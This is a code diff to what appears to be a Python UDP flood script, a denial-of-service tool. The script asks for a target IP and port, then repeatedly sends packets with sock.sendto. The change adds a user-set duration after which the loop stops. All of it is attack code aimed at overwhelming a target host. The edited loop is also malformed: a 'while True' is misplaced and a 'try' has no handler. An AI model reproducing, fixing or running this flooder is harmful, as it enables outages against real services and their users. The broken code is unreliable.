@@ -45,8 +45,16 @@ if data == "1":
     port = input("\n>>> Enter Port (Default 80) => ")
     print (Fore.BLUE + "\nPls Wait...\n")
     time.sleep(4)
-    sent = 0
-    while True:
+    dur = input("Time: ")
+    timeout = time.time() + int(dur)
+    sent = 0 
+
+while True:
+        try:
+                if time.time() > timeout:
+                          break
+                else:
+                        pass
 
         sock.sendto(bytes, (ip,port))
         sent = sent + 1
